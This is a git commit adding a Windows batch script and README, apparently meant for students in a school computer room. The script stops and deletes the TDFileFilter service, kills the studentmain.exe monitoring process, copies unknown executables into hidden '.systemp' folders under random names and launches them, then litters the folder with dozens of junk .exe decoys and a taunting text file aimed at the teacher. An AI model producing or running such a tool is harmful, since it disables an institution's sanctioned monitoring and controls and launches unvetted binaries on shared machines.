093070e89be709236be889587cef199f2f54da4d
lzh173 <1294092988@qq.com>
2024-12-11 22:48:28 +0800

    #第一次提交 除非有更好的工具出现，或者工具失效了，不然就是唯一一次提交。（什么？你说脚本有bug？不可能修的）

---
+++ !computer-room-onekey-killercmd.cmd
@@ -0,0 +1,83 @@
+@echo off
+sc stop TDFileFilter
+sc delete TDFileFilter
+
+taskkill /IM /F studentmain.exe
+taskkill /IM /F studentmain
+
+echo lzh yyds!!!!!!   make by lzh173!!!!
+echo my student id: 1240810!!!!
+echo my email : a110928@qq.com
+
+mkdir c:\\.systemp
+mkdir D:\\.systemp
+
+copy a1.exe c:\\.systemp\2ga2.exe
+copy a2.exe c:\\.systemp\1g7p.exe
+copy a3.exe c:\\.systemp\o241.exe
+copy a5.exe c:\\.systemp\2gs4.exe
+copy a6.exe c:\\.systemp\1e2g.exe
+copy a4.exe d:\\37uf.exe
+copy a1.exe c:\\2gaq.exe
+
+
+copy a2.exe c:\\bd23.exe
+copy a3.exe c:\\ok23.exe
+copy a1.exe d:\\.systemp\a13c.exe
+copy a2.exe d:\\.systemp\bd23.exe
+copy a3.exe d:\\.systemp\ok23.exe
+
+
+echo let's facking jfglzs and computer teacher!
+echo lzh yyds! make by lzh173!my email:p20210125@foxmail.com facking jfglzs and computer teacher > c:\\.systemp\fackyou.txt
+echo shutdown /s > c:\\.systemp\openme.cmd
+
+
+start c:\\.systemp\2ga2.exe
+start c:\\.systemp\o241.exe
+start c:\\.systemp\2gs4.exe
+start c:\\.systemp\1g7p.exe
+start c:\\.systemp\1e2g.exe
+start d:\\37uf.exe
+
+
+echo azczxczfshgggggggggggggg > c:\\.systemp\1e4h.exe
+echo 123xassfaqgggggggggggggg > c:\\.systemp\0o2d.exe
+echo aafdsfffshLLLLLLLLLLLLLL > c:\\.systemp\3car.exe
+echo 213cjtjyteLLLLLLLLLLLLLL > c:\\.systemp\4r2c.exe
+echo assfdsffstLLLLLLLLLLLLLL > c:\\.systemp\2cg0.exe
+echo asdbfbdfshLLLLLLLLLLLLLL > c:\\.systemp\3xv1.exe
+echo asd213dfshLLLLLLLLLLLLLL > c:\\.systemp\3rf1.exe
+echo aafdsfffshGGGGGGGGGGGGGG > c:\\.systemp\4r0o.exe
+echo asdbf12334EZEZEZEZEZEZEZ > c:\\.systemp\i9o8.exe
+echo assfdsffstEZEZEZEZEZEZEZ > c:\\.systemp\1a3c.exe
+echo asdbfbdfshEZEZEZEZEZEZEZ > c:\\.systemp\24ju.exe
+echo asd213dfshEZEZEZEZEZEZEZ > c:\\.systemp\2wx1.exe
+echo aafdsfffshEZEZEZEZEZEZEZ > c:\\.systemp\1g9l.exe
+echo asdbf12334EZEZEZEZEZEZEZ > c:\\.systemp\89ih.exe
+echo assfdsffsEZEZEZEZEZEZEZt > c:\\.systemp\2dqe.exe
+echo asdbfbdfshEZEZEZEZEZEZEZ > c:\\.systemp\24rf.exe
+echo ascvc3dfsEZEZEZEZEZEZEZh > c:\\.systemp\7ujd.exe
+echo aaxcvvcxshEZEZEZEZEZEZEZ > c:\\.systemp\23fd.exe
+echo asd3322334EZEZEZEZEZEZEZ > c:\\.systemp\un90.exe
+echo 12dfsfdsqtEZEZEZEZEZEZEZ > c:\\.systemp\f23x.exe
+echo azczxczfshgggggggggggggg > c:\\.systemp\sh4h.exe
+echo 123xassfaqgggggggggggggg > c:\\.systemp\0o3d.exe
+echo aafdsfffshLLLLLLLLLLLLLL > c:\\.systemp\1car.exe
+echo 213cjtjyteLLLLLLLLLLLLLL > c:\\.systemp\sc35.exe
+echo assfdsffstLLLLLLLLLLLLLL > c:\\.systemp\6d12.exe
+echo asdbfbdfshLLLLLLLLLLLLLL > c:\\.systemp\1g9o.exe
+echo asd213dfshLLLLLLLLLLLLLL > c:\\.systemp\1v78.exe
+echo aafdsfffshGGGGGGGGGGGGGG > c:\\.systemp\fa34.exe
+echo asdbf12334EZEZEZEZEZEZEZ > c:\\.systemp\23dp.exe
+echo assfdsffstEZEZEZEZEZEZEZ > c:\\.systemp\16yc.exe
+echo asdbfbdfshEZEZEZEZEZEZEZ > c:\\.systemp\26hu.exe
+echo asd213dfshEZEZEZEZEZEZEZ > c:\\.systemp\23da.exe
+echo aafdsfffshEZEZEZEZEZEZEZ > c:\\.systemp\2t6l.exe
+echo asdbf12334EZEZEZEZEZEZEZ > c:\\.systemp\3h6s.exe
+echo assfdsffsEZEZEZEZEZEZEZt > c:\\.systemp\2hwe.exe
+echo asdbfbdfshEZEZEZEZEZEZEZ > c:\\.systemp\15bf.exe
+echo ascvc3dfsEZEZEZEZEZEZEZh > c:\\.systemp\36nw.exe
+echo aaxcvvcxshEZEZEZEZEZEZEZ > c:\\.systemp\23sg.exe
+echo asd3322334EZEZEZEZEZEZEZ > c:\\.systemp\u4h0.exe
+echo 12dfsfdsqtEZEZEZEZEZEZEZ > c:\\.systemp\13gx.exe
--- README.md
+++ README.md
@@ -1,2 +1,4 @@
 # computer-room-onekey-killercmd
 在学校机房使用的小脚本，需搭配作者提供的一些小程序使用
+
+
